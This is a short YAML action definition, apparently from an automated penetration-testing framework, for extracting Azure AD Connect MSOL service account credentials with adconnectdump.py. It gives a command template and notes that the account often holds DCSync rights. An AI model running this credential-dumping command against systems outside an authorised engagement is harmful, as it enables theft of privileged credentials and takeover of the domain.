name: msol_password
category: ad
description: MSOL service account password extraction
preconditions:
  - domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: "python3 adconnectdump.py {domain}/{username}:{password}@{target_ip}"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Azure AD Connect stores MSOL_ service account creds in LocalDB. This account often has DCSync rights. adconnectdump extracts from registry + DPAPI."
